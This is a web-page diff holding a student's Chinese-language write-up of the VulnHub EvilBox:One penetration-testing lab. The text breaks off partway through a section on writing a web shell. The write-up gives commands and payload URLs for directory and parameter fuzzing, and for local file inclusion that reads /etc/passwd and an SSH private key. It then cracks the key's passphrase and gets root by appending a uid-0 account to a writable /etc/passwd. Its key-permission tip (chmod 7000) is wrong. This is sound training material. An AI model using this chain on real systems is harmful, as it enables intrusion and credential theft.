@@ -5,8 +5,8 @@
   <meta name="Volantis" content="5.7.1">
   <meta charset="utf-8">
   <!-- SEO相关 -->
-  <meta name="robots" content="noindex,follow">
-  <link rel="canonical" href="http://blog.kekwy.com/categories/网络攻防实战/"/>
+  
+  <link rel="canonical" href="http://blog.kekwy.com/vulnhub-evilboxone/"/>
   <!-- 渲染优化 -->
     <meta http-equiv='x-dns-prefetch-control' content='on' />
       <link rel='dns-prefetch' href='https://unpkg.com'>
@@ -33,18 +33,26 @@
   <!-- feed -->
       <link rel="alternate" href="/atom.xml" title="铃的杂货铺" type="application/atom+xml">
   <!-- 页面元数据 -->
-  <title>分类：网络攻防实战 - 铃的杂货铺</title>
-  <meta name="keywords" content="null">
+  <title>【渗透测试】第八周 vulnhub-EvilBox:One - 铃的杂货铺</title>
+  <meta name="keywords" content="学习,Kali,网络,安全,Linux,vulnhub,null">
   <meta desc name="description" content="喜欢夏天的无名之辈 - 可弟WZ铃号机 - 铃的杂货铺">
   
-<meta property="og:type" content="website">
-<meta property="og:title" content="铃的杂货铺">
-<meta property="og:url" content="http://blog.kekwy.com/categories/%E7%BD%91%E7%BB%9C%E6%94%BB%E9%98%B2%E5%AE%9E%E6%88%98/index.html">
+<meta property="og:type" content="article">
+<meta property="og:title" content="【渗透测试】第八周 vulnhub-EvilBox:One">
+<meta property="og:url" content="http://blog.kekwy.com/vulnhub-EvilBoxOne/index.html">
 <meta property="og:site_name" content="铃的杂货铺">
-<meta property="og:description" content="喜欢夏天的无名之辈">
+<meta property="og:description" content="网络攻防实战 第八次实验 邮箱：&amp;#x6b;&amp;#x65;&amp;#101;&amp;#107;&amp;#107;&amp;#101;&amp;#x77;&amp;#121;&amp;#64;&amp;#x71;&amp;#x71;&amp;#46;&amp;#99;&amp;#x6f;&amp;#109; 2022年11月8日 靶机连接：https:&#x2F;&#x2F;vulnhub.com&#x2F;entry&#x2F;evilbox-one,736&#x2F;  一、实验目的取得目标靶机的 root 权限并获得两个 flag。 我们">
 <meta property="og:locale" content="zh_CN">
 <meta property="og:image" content="http://blog.kekwy.com/media/images/logo.png">
+<meta property="article:published_time" content="2022-11-08T07:41:56.000Z">
+<meta property="article:modified_time" content="2022-11-10T07:51:45.918Z">
 <meta property="article:author" content="可弟WZ铃号机">
+<meta property="article:tag" content="学习">
+<meta property="article:tag" content="Kali">
+<meta property="article:tag" content="网络">
+<meta property="article:tag" content="安全">
+<meta property="article:tag" content="Linux">
+<meta property="article:tag" content="vulnhub">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:image" content="http://blog.kekwy.com/media/images/logo.png">
   <style>
@@ -2606,7 +2614,7 @@ if (/*@cc_on!@*/false || (!!window.MSInputMethodContext && !!document.documentMo
   
     
       <!-- see: /layout/_partial/scripts/_ctrl/coverCtrl.ejs -->
-      <div id="none" class='cover-wrapper  search' style="display: none;">
+      <div id="none" class='cover-wrapper post search' style="display: none;">
         
   <div class='cover-bg lazyload placeholder' data-bg="/media/images/cover.png"></div>
 
@@ -2697,28 +2705,8 @@ if (/*@cc_on!@*/false || (!!window.MSInputMethodContext && !!document.documentMo
       <div id="safearea">
         <div class="body-wrapper">
           
-
 <div id="l_main" class=''>
-  
-    
-      
-  <section class="post-list">
-    
-      
-        
-          
-        
-          
-        
-          
-        
-      
-    
-    
-      
-        
-          <div class='post-wrapper'>
-            <div class="post post-v3 white-box reveal shadow floatable blur"  itemscope itemtype="http://schema.org/Article" >
+  <article itemscope itemtype="http://schema.org/Article" class="article post white-box reveal md shadow floatable blur article-type-post" id="post" itemscope itemprop="blogPost">
   <link itemprop="mainEntityOfPage" href="http://blog.kekwy.com/vulnhub-EvilBoxOne/">
   <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
     <meta itemprop="name" content="铃的杂货铺">
@@ -2728,218 +2716,470 @@ if (/*@cc_on!@*/false || (!!window.MSInputMethodContext && !!document.documentMo
     <meta itemprop="description" content="喜欢夏天的无名之辈">
   </span>
   
-  
+
+
   
     <div class='headimg-div'>
-      <a class='headimg-a' href="/vulnhub-EvilBoxOne/">
-        <img itemprop="image" class='headimg' alt="【渗透测试】第八周 vulnhub-EvilBox:One" src='/media/渗透测试学习笔记/kali-ascii-16x9.png'/>
+      <a class='headimg-a'>
+        <img itemprop="image" class='headimg' src='/media/渗透测试学习笔记/kali-ascii-16x9.png'/>
       </a>
     </div>
   
-  
+  <div class="article-meta" id="top">
     
-    <h2 class="article-title"  itemprop="name headline">
-      <a href="/vulnhub-EvilBoxOne/"  itemprop="url">
+    
+    
+      <h1 class="title" itemprop="name headline">
         【渗透测试】第八周 vulnhub-EvilBox:One
-      </a>
-    </h2>
-  
-  <div class='md article-desc' itemprop="articleBody">
+      </h1>
+      <div class='new-meta-box'>
+        
+          
+            
+<div class='new-meta-item author' itemprop="author" itemscope itemtype="http://schema.org/Person">
+  <a itemprop="url" class='author' href="https://blog.kekwy.com" rel="nofollow">
+    <img itemprop="image" src="/media/images/avatar.jpg" class="lazyload" data-srcset="/media/images/avatar.jpg" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==">
+    <p itemprop="name">可弟WZ</p>
+  </a>
+</div>
+
+          
+        
+          
+            
+  <div class='new-meta-item category'>
+    <i class="fa-solid fa-folder-open fa-fw" aria-hidden="true"></i>
+    <a class="category-link" href="/categories/%E7%BD%91%E7%BB%9C%E6%94%BB%E9%98%B2%E5%AE%9E%E6%88%98/">网络攻防实战</a>
     
+      <span hidden itemprop="about" itemscope itemtype="http://schema.org/Thing">
+        <a href="/categories/%E7%BD%91%E7%BB%9C%E6%94%BB%E9%98%B2%E5%AE%9E%E6%88%98/" itemprop="url"><span itemprop="name">网络攻防实战</span></a>
+      </span>
+    
+  </div>
+
+
+          
+        
+          
+            <div class="new-meta-item date" itemprop="dateCreated datePublished" datetime="2022-11-08T15:41:56+08:00">
+  <a class='notlink'>
+    <i class="fa-solid fa-calendar-alt fa-fw" aria-hidden="true"></i>
+    <p>发布于：2022年11月8日</p>
+  </a>
+</div>
+
+          
+        
+          
+            
+
+
+<div class="new-meta-item browse">
+  <a class='notlink'>
+    <p>
+      <i class="fa-solid fa-eye fa-fw" aria-hidden="true"></i>
+      
+      <span id="lc-pv" data-title="【渗透测试】第八周 vulnhub-EvilBox:One" data-path="/vulnhub-EvilBoxOne/">
+        <span id='number'><i class="fa-solid fa-loader fa-spin fa-fw" aria-hidden="true"></i></span>
+      </span>
+      
+      <span>次浏览</span>
+    </p>
+  </a>
+</div>
+
+
+          
+        
+        <!-- Custom Files topMeta begin-->
+        
+        <!-- Custom Files topMeta end-->
+      </div>
+    
+  </div>
+
+
+  <div id="layoutHelper-page-plugins"></div>
+  <div id="post-body" itemprop="articleBody">
+    <blockquote>
+<p>网络攻防实战 第八次实验</p>
+<p>邮箱：<a href="mailto:&#x6b;&#x65;&#101;&#107;&#107;&#101;&#x77;&#121;&#64;&#x71;&#x71;&#46;&#99;&#x6f;&#109;">&#x6b;&#x65;&#101;&#107;&#107;&#101;&#x77;&#121;&#64;&#x71;&#x71;&#46;&#99;&#x6f;&#109;</a></p>
+<p>2022年11月8日</p>
+<p>靶机连接：<a target="_blank" rel="noopener" href="https://vulnhub.com/entry/evilbox-one,736/">https://vulnhub.com/entry/evilbox-one,736/</a></p>
+</blockquote>
+<div class="story post-story"><h2 id="一、实验目的"><a href="#一、实验目的" class="headerlink" title="一、实验目的"></a>一、实验目的</h2><p>取得目标靶机的 root 权限并获得两个 flag。</p>
+<p>我们将使用到以下攻击手段：</p>
+<ul>
+<li>主机发现、端口扫描</li>
+<li>隐藏路径爆破</li>
+<li>参数名爆破</li>
+<li>文件包含漏洞的发现以及利用</li>
+<li>SSH 登入</li>
+<li>私钥密码爆破</li>
+<li>特定权限文件的发现</li>
+<li>添加自定义用户记录</li>
+</ul>
+</div><div class="story post-story"><h2 id="二、实验内容"><a href="#二、实验内容" class="headerlink" title="二、实验内容"></a>二、实验内容</h2><blockquote>
+<p>kali: 10.0.2.15</p>
+<p>靶机: 10.0.2.12</p>
+</blockquote>
+<h3 id="0x00-准备工作"><a href="#0x00-准备工作" class="headerlink" title="0x00. 准备工作"></a>0x00. 准备工作</h3><ol>
+<li><p>获取靶机 IP 并扫描其开放的端口以及个端口上对应的服务：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">sudo arp-scan -I eth0 -l</span></span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">sudo nmap -p- 10.0.2.12 -A</span></span><br></pre></td></tr></table></figure>
+
+<img src="https://kekwy.oss-cn-nanjing.aliyuncs.com/post/image-20221108211601033.png" class="lazyload" data-srcset="https://kekwy.oss-cn-nanjing.aliyuncs.com/post/image-20221108211601033.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="image-20221108211601033" />  
+</li>
+<li><p>访问80端口发现是一个 <code>Apache2 Debian</code> 的默认页面，没有对渗透有帮助的信息：</p>
+<img src="https://kekwy.oss-cn-nanjing.aliyuncs.com/post/image-20221108211801201.png" class="lazyload" data-srcset="https://kekwy.oss-cn-nanjing.aliyuncs.com/post/image-20221108211801201.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="image-20221108211801201"  /></li>
+</ol>
+<h3 id="0x01-隐藏路径爆破"><a href="#0x01-隐藏路径爆破" class="headerlink" title="0x01. 隐藏路径爆破"></a>0x01. 隐藏路径爆破</h3><ol>
+<li><p>首先使用 <code>dirsearch</code> 进行路径爆破：</p>
+<img src="https://kekwy.oss-cn-nanjing.aliyuncs.com/post/image-20221108212228720.png" class="lazyload" data-srcset="https://kekwy.oss-cn-nanjing.aliyuncs.com/post/image-20221108212228720.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="image-20221108212228720" /> 
+
+<p>找到了隐藏路径 <code>/secret/</code> 和隐藏文件 <code>robots.txt</code>。</p>
+<p>分别访问均没有获得有效信息。</p>
+<p>ps：<a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_41092170/article/details/117701816">robots.txt</a></p>
+</li>
+<li><p>对 <code>/secret/</code> 做进一步路径爆破：</p>
+<p>直接使用 <code>dirsearch</code> 由于字典限制无法找到更多信息，此处使用 <code>gobuster</code> 进行爆破。</p>
+<blockquote>
+<p>安装：apt install gobuster</p>
+<p>安装字典：apt install seclists</p>
+<p>渗透测试要尝试掌握多种工具</p>
+</blockquote>
+<p>使用指定字典进行路径爆破：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">gobuster <span class="built_in">dir</span> -u http://10.0.2.12/secret/ -w /usr/share/seclists/Discovery/Web-Content/directory-list-1.0.txt -x txt,php,html,jsp</span></span><br></pre></td></tr></table></figure>
+
+<img src="https://kekwy.oss-cn-nanjing.aliyuncs.com/post/image-20221108213853527.png" class="lazyload" data-srcset="https://kekwy.oss-cn-nanjing.aliyuncs.com/post/image-20221108213853527.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="image-20221108213853527" />  
+
+<p>除了主页文件之外，还发现一个 PHP 文件 <code>evil.php</code>。直接通过 url 访问该文件发现只有一个空白页面，猜测可能需要通过 <code>GET</code> 方法提供一个参数（即在 url 后添加某个参数）。</p>
+</li>
+</ol>
+<h3 id="0x02-参数名爆破"><a href="#0x02-参数名爆破" class="headerlink" title="0x02. 参数名爆破"></a>0x02. 参数名爆破</h3><p>使用 <code>ffuf</code> 工具对该参数键值对（参数名和对应的值）进行爆破：</p>
+<ol>
+<li><p>首先期望存在命令注入漏洞：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">ffuf -w /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt:PARAM  -u http://10.0.2.12/secret/evil.php?PARAM=<span class="built_in">ls</span> -fs 0</span></span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>选择字典文件 burp-parameter-names.txt 作为参数名；</li>
+<li>命令 <code>ls</code> 作为参数值。</li>
+</ul>
+<p>进行爆破后，为获得有效结果，爆破失败。</p>
+</li>
+<li><p>期望存在文件包含漏洞：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">ffuf -w /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt:PARAM  -u http://10.0.2.12/secret/evil.php?PARAM=../index.html -fs 0</span></span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>选择字典文件 burp-parameter-names.txt 作为参数名；</li>
+<li>已知存在的主页文件的路径作为参数值。</li>
+</ul>
+<img src="https://kekwy.oss-cn-nanjing.aliyuncs.com/post/image-20221108225352732.png" class="lazyload" data-srcset="https://kekwy.oss-cn-nanjing.aliyuncs.com/post/image-20221108225352732.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="image-20221108225352732" /> 
+
+<p>爆破成功，结果显示需要提供的参数名为 <code>command</code> 。</p>
+</li>
+<li><p>查看靶机文件验证漏洞存在：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://10.0.2.12/secret/evil.php?command=/etc/passwd</span><br></pre></td></tr></table></figure>
+
+<p>查看返回页面源码：</p>
+<img src="https://kekwy.oss-cn-nanjing.aliyuncs.com/post/image-20221108225808433.png" class="lazyload" data-srcset="https://kekwy.oss-cn-nanjing.aliyuncs.com/post/image-20221108225808433.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="image-20221108225808433" width=300% /> 
+
+<p>读取了靶机上的 <code>/etc/passwd</code> 文件，确认存在文件包含漏洞。</p>
+</li>
+</ol>
+<h3 id="0x03-SSH-私钥密码爆破"><a href="#0x03-SSH-私钥密码爆破" class="headerlink" title="0x03. SSH 私钥密码爆破"></a>0x03. SSH 私钥密码爆破</h3><ol>
+<li><p>通过分析上述文件内容，发现靶机中除 root 用户外还存在一个 <code>mowree</code> 用户拥有登录权限，其主目录为 <code>/home/mowree</code>.尝试获取其被允许的 SSH 登录方式：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">ssh mowree@10.0.2.12 -v    <span class="comment"># debug模式</span></span></span><br></pre></td></tr></table></figure>
+
+<img src="https://kekwy.oss-cn-nanjing.aliyuncs.com/post/image-20221109091744345.png" class="lazyload" data-srcset="https://kekwy.oss-cn-nanjing.aliyuncs.com/post/image-20221109091744345.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="image-20221109091744345" width=300% />
+
+<p>发现除了允许输入对应密码登录外还可以使用密钥登录。</p>
+</li>
+<li><p>通过文件包含漏洞查看靶机上该用户的私钥：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://10.0.2.12/secret/evil.php?command=/home/mowree/.ssh/id_rsa</span><br></pre></td></tr></table></figure>
+
+<img src="https://kekwy.oss-cn-nanjing.aliyuncs.com/post/image-20221109092317615.png" class="lazyload" data-srcset="https://kekwy.oss-cn-nanjing.aliyuncs.com/post/image-20221109092317615.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="image-20221109092317615" width=300% /> 
+
+<p>将其保存在文件 <code>id_rsa</code> 中。 </p>
+</li>
+<li><p>使用指定私钥登录靶机：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"># ssh mowree@10.0.2.12 -i id_rsa</span><br></pre></td></tr></table></figure>
+
+<p>发现需要输入私钥的密码：</p>
+<img src="https://kekwy.oss-cn-nanjing.aliyuncs.com/post/image-20221109093513763.png" class="lazyload" data-srcset="https://kekwy.oss-cn-nanjing.aliyuncs.com/post/image-20221109093513763.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="image-20221109093513763" /> 
+
+<p>考虑对其进行爆破。  </p>
+<p>如果出现报错：</p>
+<img src="https://kekwy.oss-cn-nanjing.aliyuncs.com/post/image-20221109093055156.png" class="lazyload" data-srcset="https://kekwy.oss-cn-nanjing.aliyuncs.com/post/image-20221109093055156.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="image-20221109093055156" /> 
+
+<p>这是说密钥文件权限不能为0644，0644权限太开放了，要求你的密钥文件不能被其它用户读取。</p>
+<p>修改权限为7000即可：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash"><span class="built_in">chmod</span> 7000 id_rsa</span></span><br></pre></td></tr></table></figure>
+
+<p>参考：<a target="_blank" rel="noopener" href="https://blog.csdn.net/Figure_hb/article/details/90754146">https://blog.csdn.net/Figure_hb/article/details/90754146</a></p>
+</li>
+<li><p>将密钥文件转换为 <code>john</code> 可用的 hash 文件：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"># /usr/share/john/ssh2john.py ./id_rsa &gt; id_rsa.hash</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>使用 <code>john</code> 进行爆破：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">john id_rsa.hash --wordlist=rockyou.txt</span></span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>该字典文件可通过在 kali 上使用 locate 指令搜索得到</p>
+</blockquote>
+<img src="https://kekwy.oss-cn-nanjing.aliyuncs.com/post/image-20221109094836969.png" class="lazyload" data-srcset="https://kekwy.oss-cn-nanjing.aliyuncs.com/post/image-20221109094836969.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="image-20221109094836969" /> 
+
+<p>成功获取私钥密码 <code>unicorn</code>。</p>
+</li>
+<li><p>成功登入靶机：</p>
+<img src="https://kekwy.oss-cn-nanjing.aliyuncs.com/post/image-20221109095933335.png" class="lazyload" data-srcset="https://kekwy.oss-cn-nanjing.aliyuncs.com/post/image-20221109095933335.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="image-20221109095933335" /></li>
+</ol>
+<h3 id="0x04-信息收集"><a href="#0x04-信息收集" class="headerlink" title="0x04. 信息收集"></a>0x04. 信息收集</h3><ol>
+<li><p>查看当前目录下的文件，获取第一个 Flag：</p>
+<img src="https://kekwy.oss-cn-nanjing.aliyuncs.com/post/image-20221109100516303.png" class="lazyload" data-srcset="https://kekwy.oss-cn-nanjing.aliyuncs.com/post/image-20221109100516303.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="image-20221109100516303" /> 
+
+<p><strong>Flag1：</strong>56Rbp0soobpzWSVzKh9YOvzGLgtPZQ</p>
+</li>
+<li><p>当前用户路径下没有其他有价值的文件，在靶机上寻找用户可以写入的文件：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">find / -perm -o+w -maxdepth 3 -<span class="built_in">print</span> | grep -v /dev| grep -v /sys | grep -v /proc | grep -v /boot | grep -v /run &gt; res.txt</span></span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>find指令的使用：<a target="_blank" rel="noopener" href="https://blog.csdn.net/m0_46674735/article/details/112390027">https://blog.csdn.net/m0_46674735/article/details/112390027</a></p>
+<p>使用find命令按权限查找文件：<a target="_blank" rel="noopener" href="https://www.iplayio.cn/post/596968725">https://www.iplayio.cn/post/596968725</a></p>
+</blockquote>
+<ul>
+<li><p>-o+w：查找其他用户有写权限的文件，（由于期望目标文件所有者是 root，我们目前的用户相对 root 即为 other users）；</p>
+</li>
+<li><p>-maxdepth：从根目录开始搜索的最大深度为3；</p>
+</li>
+<li><p>-print：将输出结果写入标准输出文件；</p>
+</li>
+<li><p>grep -v &#x2F;dev| grep -v &#x2F;sys | grep -v &#x2F;proc | grep -v &#x2F;boot | grep -v &#x2F;run：</p>
+<p>忽略以上目录下的搜索结果；</p>
+</li>
+<li><p>&gt; res.txt：将标准输出重定向为 res.txt 文件，即将筛选后的搜索结果保存在该文件中。</p>
+</li>
+</ul>
+<p>查看搜索结果，发现 <code>/etc/passwd</code> 文件竟然可以被其他用户写入：</p>
+<body style="text-align:left">
+<img src="https://kekwy.oss-cn-nanjing.aliyuncs.com/post/image-20221109173321185.png" class="lazyload" data-srcset="https://kekwy.oss-cn-nanjing.aliyuncs.com/post/image-20221109173321185.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="image-20221109173321185" width=700/>
+</body>
+</li>
+<li><p>进一步验证：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash"><span class="built_in">ls</span> /etc/passwd -al</span></span><br></pre></td></tr></table></figure>
+
+<body style="text-align:left">
+<img src="https://kekwy.oss-cn-nanjing.aliyuncs.com/post/image-20221109173503185.png" class="lazyload" data-srcset="https://kekwy.oss-cn-nanjing.aliyuncs.com/post/image-20221109173503185.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="image-20221109173503185" width=700 />
+</body>
+
+<p>发现我们确实具有写权限。</p>
+<p>设想如果我们在其中插入一条具有 root 权限的密码自定义的用户记录，切换到我们自定义的用户即可获取 root 权限。</p>
+</li>
+</ol>
+<h3 id="0x05-自定义-root-用户"><a href="#0x05-自定义-root-用户" class="headerlink" title="0x05. 自定义 root 用户"></a>0x05. 自定义 root 用户</h3><ol>
+<li><p>首先需要在 kali 上对我们自定义的密码进行加密。使用工具 <code>openssl</code>：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">openssl passwd</span></span><br></pre></td></tr></table></figure>
+
+<p>这里我输入的明文密码为 <code>test123</code>。<img src="https://kekwy.oss-cn-nanjing.aliyuncs.com/post/image-20221109180626629.png" class="lazyload" data-srcset="https://kekwy.oss-cn-nanjing.aliyuncs.com/post/image-20221109180626629.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="image-20221109180626629"> </p>
+</li>
+<li><p>使用得到的密码密文，参照 passwd 文件中 root 用户的记录自定义一条用户记录：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">test123:$1$5zwm/pYB$109Okt6Ql.GcBYi/z16xT1:0:0:root:/root:/bin/bash</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>将该记录追加在 <code>/etc/passwd</code> 文件中：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash"><span class="built_in">echo</span> <span class="string">&#x27;test123:$1$5zwm/pYB$109Okt6Ql.GcBYi/z16xT1:0:0:root:/root:/bin/bash&#x27;</span> &gt;&gt; /etc/passwd</span></span><br></pre></td></tr></table></figure>
+</li>
+<li><p>切换到用户 <code>test123</code>：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">su test123</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="https://kekwy.oss-cn-nanjing.aliyuncs.com/post/image-20221109181310735.png" class="lazyload" data-srcset="https://kekwy.oss-cn-nanjing.aliyuncs.com/post/image-20221109181310735.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="image-20221109181310735"> </p>
+<p>成功提权。</p>
+</li>
+<li><p>切换到 root 目录，发现第二个 Flag：</p>
+<p><img src="https://kekwy.oss-cn-nanjing.aliyuncs.com/post/image-20221109181455730.png" class="lazyload" data-srcset="https://kekwy.oss-cn-nanjing.aliyuncs.com/post/image-20221109181455730.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="image-20221109181455730"> </p>
+<p><strong>Flag2：</strong>36QtXfdJWvdC0VavlPIApUbDlqTsBM</p>
+</li>
+</ol>
+</div><div class="story post-story"><h2 id="三、实验结果"><a href="#三、实验结果" class="headerlink" title="三、实验结果"></a>三、实验结果</h2><ul>
+<li><p><strong>Flag1：</strong>56Rbp0soobpzWSVzKh9YOvzGLgtPZQ</p>
+</li>
+<li><p><strong>Flag2：</strong>36QtXfdJWvdC0VavlPIApUbDlqTsBM</p>
+</li>
+<li><p><strong>root：</strong></p>
+<p><img src="https://kekwy.oss-cn-nanjing.aliyuncs.com/post/image-20221109181310735.png" class="lazyload" data-srcset="https://kekwy.oss-cn-nanjing.aliyuncs.com/post/image-20221109181310735.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="image-20221109181310735"></p>
+</li>
+</ul>
+</div><div class="story post-story"><h2 id="四、总结"><a href="#四、总结" class="headerlink" title="四、总结"></a>四、总结</h2><ul>
+<li>根据发现的端口首先通过浏览器访问靶机的80端口，发现没有有效信息，考虑隐藏路径爆破；</li>
+<li>使用 <code>dirsearch</code> 爆破到存在 <code>/secret/</code> 路径，但是继续爆破无果。换用 <code>gobuster</code> 进行路径爆破，最终找到一个 PHP 文件 <code>evil.php</code>；</li>
+<li>直接访问返回空白页，推测其可能需要一个参数，使用 <code>ffuf</code> 进行参数名的爆破，最终发现存在文件包含漏洞；</li>
+<li>通过文件包含漏洞查看文件 <code>/etc/passwd</code>，发现一个可以登录的用户 <code>mowree</code>。使用 ssh 尝试登录发现该用户还支持私钥认证登录；</li>
+<li>通过文件包含漏洞获取靶机对应路径下的私钥，并使用 <code>john</code> 对私钥密码进行爆破；</li>
+<li>成功登入靶机后，发现当前用户对 <code>/etc/passwd</code> 文件具有写权限，添加一个具有 root 身份的密码自定义的用户记录；</li>
+<li>使用我们自定义的密码切换至上述自定义用户，成功获取 root 权限。</li>
+</ul>
+</div><div class="story post-story"><h2 id="五、思路拓展"><a href="#五、思路拓展" class="headerlink" title="五、思路拓展"></a>五、思路拓展</h2><ol>
+<li><p>对于一个文件包含漏洞，可以首先尝试有没有远程文件包含漏洞，如果有即可让其执行 kali 的 web 服务上的一句话木马或反弹 shell 等攻击脚本。（本次实验中不存在该漏洞）</p>
+</li>
+<li><p>也可以考虑先编码，再通过文件包含漏洞读出编码后的 PHP 代码，可以实现避免执行代码而是读取代码的内容。这里可以尝试将 <code>evil.php</code> 读出：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://10.0.2.12/secret/evil.php?command=php://filter/convert.base64-encode/resource=evil.php</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li><code>PD9waHAKICAgICRmaWxlbmFtZSA9ICRfR0VUWydjb21tYW5kJ107CiAgICBpbmNsdWRlKCRmaWxlbmFtZSk7Cj8+Cg==</code></li>
+</ul>
+</li>
+<li><p>通过 <a target="_blank" rel="noopener" href="https://icyberchef.com/">icyberchef</a> 进行解码：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="variable">$filename</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;command&#x27;</span>];</span><br><span class="line">    <span class="keyword">include</span>(<span class="variable">$filename</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>成功获取到 <code>evil.php</code> 的源码。</p>
+</li>
+<li><p>尝试进行写入，如果成功则可以通过此漏洞写入一句话木马脚本：</p>
